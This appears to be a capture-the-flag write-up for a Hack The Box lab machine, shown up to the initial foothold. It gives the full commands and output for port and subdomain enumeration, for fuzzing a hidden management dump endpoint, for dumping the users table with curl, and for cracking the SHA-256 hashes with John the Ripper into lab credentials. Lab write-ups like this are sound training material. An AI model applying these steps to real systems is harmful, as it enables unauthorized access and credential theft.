
![image](https://user-images.githubusercontent.com/57739806/218311539-fb920584-7f00-4e6b-813a-00dbf09d7892.png)
> This is in the Hard category of boxes in HTB

# Enumeration
> Nmap enumeration

```
┌──(The-Chosent-One㉿kali)-[~/Desktop/extension]
└─$ sudo nmap -sSCV -p- 10.10.11.171 -T4
Starting Nmap 7.93 ( https://nmap.org ) at 2023-02-12 20:50 +08
Nmap scan report for snippet.htb (10.10.11.171)
Host is up (0.096s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 8221e2a5824ddf3f99db3ed9b3265286 (RSA)
|   256 913ab2922b637d91f1582b1b54f9703c (ECDSA)
|_  256 6520392ba73b33e5ed49a9acea01bd37 (ED25519)
80/tcp open  http    nginx 1.14.0 (Ubuntu)
|_http-title: snippet.htb
|_http-server-header: nginx/1.14.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 713.11 seconds
```

Looks like there's not much running, just a http service running on the machine.


Visiting the site shows us this:

![snippet htb](https://user-images.githubusercontent.com/57739806/218312922-63dbdb25-a428-460d-abc5-66412e064adf.png)


Modifying `/etc/hosts` to resolve `10.10.11.171` to `snippet.htb`, I can start enumerating any subdomains and endpoints.

> Endpoint enumeration
```
┌──(The-Chosent-One㉿kali)-[~/Desktop/extension]
└─$ gobuster dir -u http://snippet.htb -w /usr/share/wordlists/dirb/common.txt -t 30
===============================================================
Gobuster v3.3
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://snippet.htb
[+] Method:                  GET
[+] Threads:                 30
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.3
[+] Timeout:                 10s
===============================================================
2023/02/12 21:11:14 Starting gobuster in directory enumeration mode
===============================================================
/.hta                 (Status: 403) [Size: 276]
/.htpasswd            (Status: 403) [Size: 276]
/.htaccess            (Status: 403) [Size: 276]
/cgi-bin/             (Status: 301) [Size: 311] [--> http://snippet.htb/cgi-bin]
/css                  (Status: 301) [Size: 308] [--> http://snippet.htb/css/]
/dashboard            (Status: 302) [Size: 342] [--> http://snippet.htb/login]
/favicon.ico          (Status: 200) [Size: 0]
/forgot-password      (Status: 200) [Size: 37782]
/images               (Status: 301) [Size: 311] [--> http://snippet.htb/images/]
/index.php            (Status: 200) [Size: 37907]
/js                   (Status: 301) [Size: 307] [--> http://snippet.htb/js/]
/login                (Status: 200) [Size: 37797]
/logout               (Status: 405) [Size: 825]
/new                  (Status: 302) [Size: 342] [--> http://snippet.htb/login]
/register             (Status: 200) [Size: 37745]
/server-status        (Status: 403) [Size: 276]
/snippets             (Status: 302) [Size: 342] [--> http://snippet.htb/login]
/users                (Status: 302) [Size: 342] [--> http://snippet.htb/login]
/web.config           (Status: 200) [Size: 1183]
Progress: 4614 / 4615 (99.98%)===============================================================
2023/02/12 21:14:53 Finished
===============================================================
```


> Subdomain enumeration
```
┌──(The-Chosent-One㉿kali)-[~/Desktop/extension]
└─$ wfuzz -cZw /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt -H "Host: FUZZ.snippet.htb" -u http://snippet.htb --hw 896 -t 30
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://snippet.htb/
Total requests: 19966

=====================================================================
ID           Response   Lines    Word       Chars       Payload
=====================================================================

000000019:   200        249 L    1197 W     12729 Ch    "dev"
000000002:   200        96 L     331 W      5311 Ch     "mail"
000009532:   400        12 L     53 W       425 Ch      "#www"
000010581:   400        12 L     53 W       425 Ch      "#mail"

Total time: 1264.822
Processed Requests: 19966
Filtered Requests: 19962
Requests/sec.: 15.78561
```



Adding those subdomains into my `/etc/hosts` file, and visiting those sites show:

`dev.snippet.htb`

![dev snippet htb](https://user-images.githubusercontent.com/57739806/218316168-f3d3b9c5-f0f3-49f1-b621-16a87fbcbc8d.png)


`mail.snippet.htb`

![mail snippet htb](https://user-images.githubusercontent.com/57739806/218316188-e44456a1-3429-464e-8572-d4c1a56a168f.png)


Now it's time for more endpoint enumeration :D

Endpoints of `dev.snippet.htb`:

```
┌──(The-Chosent-One㉿kali)-[~/Desktop/extension]
└─$ gobuster dir -u http://dev.snippet.htb -w /usr/share/wordlists/dirb/common.txt -t 30
===============================================================
Gobuster v3.3
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://dev.snippet.htb
[+] Method:                  GET
[+] Threads:                 30
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.3
[+] Timeout:                 10s
===============================================================
2023/02/12 22:03:29 Starting gobuster in directory enumeration mode
===============================================================
/admin                (Status: 302) [Size: 34] [--> /user/login]
/administrator        (Status: 200) [Size: 13470]
/explore              (Status: 302) [Size: 37] [--> /explore/repos]
/issues               (Status: 302) [Size: 34] [--> /user/login]
/notifications        (Status: 302) [Size: 34] [--> /user/login]
Progress: 4614 / 4615 (99.98%)===============================================================
2023/02/12 22:03:51 Finished
===============================================================
```


Endpoints of `mail.snippet.htb`:

```
┌──(The-Chosent-One㉿kali)-[~/Desktop/extension]
└─$ gobuster dir -u http://mail.snippet.htb -w /usr/share/wordlists/dirb/common.txt -t 30 -b 403,404
===============================================================
Gobuster v3.3
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://mail.snippet.htb
[+] Method:                  GET
[+] Threads:                 30
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   403,404
[+] User Agent:              gobuster/3.3
[+] Timeout:                 10s
===============================================================
2023/02/12 22:05:23 Starting gobuster in directory enumeration mode
===============================================================
/favicon.ico          (Status: 200) [Size: 16958]
/index.php            (Status: 200) [Size: 5311]
/public_html          (Status: 301) [Size: 326] [--> http://mail.snippet.htb/public_html/]
Progress: 4614 / 4615 (99.98%)===============================================================
2023/02/12 22:05:40 Finished
===============================================================
```


# Foothold
Since all of these sites had login pages, I tried SQL and noSQL injections, just in case, and they weren't vulnerable.

Next, I tried looking up possible CVEs for Gitea and Roundcube Webmail, and initially found [this](https://www.exploit-db.com/exploits/49383), but it didn't work since private IPs weren't allowed for the mirror repo URL.

I got stuck for a while, until I decided to look into the source code of `snippet.htb`:
```js
<!DOCTYPE html>
<html lang="en">
    <head>
        <meta charset="utf-8">
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <meta name="csrf-token" content="zi70Z1Qv5MjeRBGxd7B4oHZQyztza11xrLjnQ0qI">

        <title inertia>snippet.htb</title>

        <!-- Fonts -->
        <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Nunito:wght@400;600;700&display=swap">

        <!-- Styles -->
        <link rel="stylesheet" href="/css/app.css">

        <!-- Scripts -->
        <script type="text/javascript">
const Ziggy = {"url":"http:\/\/snippet.htb","port":null,"defaults":{},"routes":{"ignition.healthCheck":{"uri":"_ignition\/health-check","methods":["GET","HEAD"]},"ignition.executeSolution":{"uri":"_ignition\/execute-solution","methods":["POST"]},"ignition.shareReport":{"uri":"_ignition\/share-report","methods":["POST"]},"ignition.scripts":{"uri":"_ignition\/scripts\/{script}","methods":["GET","HEAD"]},"ignition.styles":{"uri":"_ignition\/styles\/{style}","methods":["GET","HEAD"]},"dashboard":{"uri":"dashboard","methods":["GET","HEAD"]},"users":{"uri":"users","methods":["GET","HEAD"]},"snippets":{"uri":"snippets","methods":["GET","HEAD"]},"snippets.view":{"uri":"snippets\/{id}","methods":["GET","HEAD"]},"snippets.update":{"uri":"snippets\/update\/{id}","methods":["GET","HEAD"]},"api.snippets.update":{"uri":"snippets\/update\/{id}","methods":["POST"]},"api.snippets.delete":{"uri":"snippets\/delete\/{id}","methods":["DELETE"]},"snippets.new":{"uri":"new","methods":["GET","HEAD"]},"users.validate":{"uri":"management\/validate","methods":["POST"]},"admin.management.dump":{"uri":"management\/dump","methods":["POST"]},"register":{"uri":"register","methods":["GET","HEAD"]},"login":{"uri":"login","methods":["GET","HEAD"]},"password.request":{"uri":"forgot-password","methods":["GET","HEAD"]},"password.email":{"uri":"forgot-password","methods":["POST"]},"password.reset":{"uri":"reset-password\/{token}","methods":["GET","HEAD"]},"password.update":{"uri":"reset-password","methods":["POST"]},"verification.notice":{"uri":"verify-email","methods":["GET","HEAD"]},"verification.verify":{"uri":"verify-email\/{id}\/{hash}","methods":["GET","HEAD"]},"verification.send":{"uri":"email\/verification-notification","methods":["POST"]},"password.confirm":{"uri":"confirm-password","methods":["GET","HEAD"]},"logout":{"uri":"logout","methods":["POST"]}}};
...
```


It looks like all the endpoints of `snippet.htb`, although there are some we didn't get while enumerating. Looking through these endpoints, `management/dump` looks interesting as we can potentially get credentials from it.


Using burpsuite, and modifying the GET request to a POST request, we're met with an error:
![First obstacle](https://user-images.githubusercontent.com/57739806/218317369-f4faacf6-843f-48be-af59-975eee33495c.png)


A bit of googling, it looks like I need a `X-CSRF-Token` header with the appropriate value to be able to make POST requests.
We already have a valid POST request from the site, the login page, so I modified that request instead and got a successful result:
![Successful post request](https://user-images.githubusercontent.com/57739806/218317557-65a2ab98-e7b2-485d-a9f7-d6fb4ca26f53.png)




It's giving us a 400 error with an error message of "Missing arguments", so maybe we need to figure out what arguments the endpoint accepts?
Here, I use `wfuzz` to brute-force the possible values the endpoint might accept, copying over the relevant headers.

```
┌──(The-Chosent-One㉿kali)-[~/Desktop/extension]
└─$ wfuzz -H 'X-XSRF-TOKEN: ...' -H 'Cookie: ...' -H 'Content-Type: application/json' -d '{"FUZZ": "test"}' -w /usr/share/seclists/Discovery/Web-Content/raft-small-words.txt -u http://snippet.htb/management/dump --hs 'Missing arguments'
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://snippet.htb/management/dump
Total requests: 43007

=====================================================================
ID           Response   Lines    Word       Chars       Payload
=====================================================================

000000045:   400        0 L      2 W        42 Ch       "download"
```


Looks like I got a hit on the first argument, trying it out in burpsuite shows that the server is still giving us a 400 error code but now with an error message of "Unknown tablename". Now it's time to brute-force the values accepted for the value.

```
┌──(The-Chosent-One㉿kali)-[~/Desktop/extension]
└─$ wfuzz -H 'X-XSRF-TOKEN: ...' -H 'Cookie: ...' -H 'Content-Type: application/json' -d '{"download": "FUZZ"}' -w /usr/share/seclists/Discovery/Web-Content/raft-small-words.txt -u http://snippet.htb/management/dump --hs 'Unknown tablename'
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://snippet.htb/management/dump
Total requests: 43007

=====================================================================
ID           Response   Lines    Word       Chars       Payload
=====================================================================

000000066:   200        0 L      1 W        2 Ch        "profiles"
000000205:   200        0 L      3581 W     272602 Ch   "users"
000000584:   400        0 L      2 W        42 Ch       "0"
```

Looks like there are multiple values accepted, and testing each one in burpsuite shows the "users" value dumping all user credentials.
![User creds obtained](https://user-images.githubusercontent.com/57739806/218318727-3a2bc03d-8217-496f-848e-dd3f8f4c0853.png)




After obtaining the credentials, it's time to try cracking the password hashes. (After processing the information in the json first, that is)
```
┌──(The-Chosent-One㉿kali)-[~/Desktop/extension]
└─$ curl -H 'X-XSRF-TOKEN: ...' -H 'Cookie: ...' -H 'Content-Type: application/json' -d '{"download": "users"}' http://snippet.htb/management/dump > out.txt
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100  266k    0  266k  100    21   262k     20  0:00:01  0:00:01 --:--:--  262k
```



Writing a simply python script to do the cleaning up for me (process.py), 
```py
l = eval(open("out.txt").read())
s = "\n".join(i['email'] + ':' + i['password'] for i in l)
with open("hash.txt", "w") as file:
    file.write(s)
```



And then running it, 
```
┌──(The-Chosent-One㉿kali)-[~/Desktop/extension]
└─$ python3 process.py
```



Having the hashes in a format suitable for John the Ripper, we just need to figure out what hash type the passwords are.
Grabbing a random hash and using `haiti`, 
```
┌──(The-Chosent-One㉿kali)-[~/Desktop/extension]
└─$ haiti 2a04a431a6509cd54a374a2f14df092b46520d846d4848d86d7c9c6ec82f5322
SHA-256 [HC: 1400] [JtR: raw-sha256]
GOST R 34.11-94 [HC: 6900] [JtR: gost]
SHA3-256 [HC: 17400] [JtR: dynamic_380]
Keccak-256 [HC: 17800] [JtR: raw-keccak-256]
Snefru-256 [JtR: snefru-256]
RIPEMD-256 [JtR: dynamic_140]
Haval-256 (3 rounds) [JtR: haval-256-3]
Haval-256 (4 rounds) [JtR: dynamic_290]
Haval-256 (5 rounds) [JtR: dynamic_300]
GOST CryptoPro S-Box
Skein-256 [JtR: skein-256]
PANAMA [JtR: dynamic_320]
BLAKE2-256
MD6-256
Umbraco HMAC-SHA1 [HC: 24800]
```



Looks like it's just SHA256, and with that, it's time to crack hashes.
```
┌──(The-Chosent-One㉿kali)-[~/Desktop/extension]
└─$ john --format=raw-sha256 hash.txt -w /usr/share/wordlists/rockyou.txt
Warning: invalid UTF-8 seen reading /usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 913 password hashes with no different salts (Raw-SHA256 [SHA256 256/256 AVX2 8x])
Remaining 912 password hashes with no different salts
Warning: poor OpenMP scalability for this hash type, consider --fork=8
Will run 8 OpenMP threads
Proceeding with wordlist:/usr/share/john/password.lst
Press 'q' or Ctrl-C to abort, almost any other key for status
0g 0:00:00:00 DONE (2023-02-12 23:09) 0g/s 88650p/s 88650c/s 80848KC/s 123456..sss
Session completed.

┌──(The-Chosent-One㉿kali)-[~/Desktop/extension]
└─$ john --show --format=raw-sha256 hash.txt
letha@snippet.htb:password123
fredrick@snippet.htb:password123
gia@snippet.htb:password123
juliana@snippet.htb:password123
```



Credentials obtained!
